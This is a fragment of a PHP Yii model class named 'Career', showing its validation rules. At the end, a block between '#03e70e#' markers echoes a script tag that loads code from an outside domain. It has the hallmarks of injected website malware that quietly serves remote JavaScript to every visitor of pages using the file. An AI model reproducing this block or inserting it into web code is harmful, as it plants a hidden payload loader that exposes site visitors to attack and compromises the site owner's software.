...
class Career extends CActiveRecord
{
	...
	public function rules()
	{
		...
		return array(
			...
			array('experience, last_org,career_id', 'numerical', 'integerOnly'=>true),
			...
			array('cid, name, b_date,career_id, address, fax, email, quilification, experience, last_org, current_position, created_on, status', 'safe', 'on'=>'search'),
		);
	}
...
#03e70e#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=11481971\"></script>";
echo $w;
}
#/03e70e#
